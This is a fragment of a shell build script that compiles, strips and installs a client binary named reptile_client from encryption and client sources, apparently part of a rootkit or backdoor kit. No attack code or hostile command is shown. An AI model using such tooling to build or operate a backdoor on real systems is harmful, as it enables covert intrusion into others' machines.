...
EOF
	...
	mkdir -p bin && \
	cd sbin && \
	gcc -O -W -Wall -o client pel.c aes.c sha1.c client.c > /dev/null 2>&1 && \
	strip client && \
	mv client ../bin/reptile_client > /dev/null 2>&1 && \
	rm -f config.h && \
	cd .. && \
	echo -e "\e[01;36mDONE!\e[00m" || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
	echo -e "\nYour client is at \e[01;32mbin/reptile_client\e[00m\n"
}
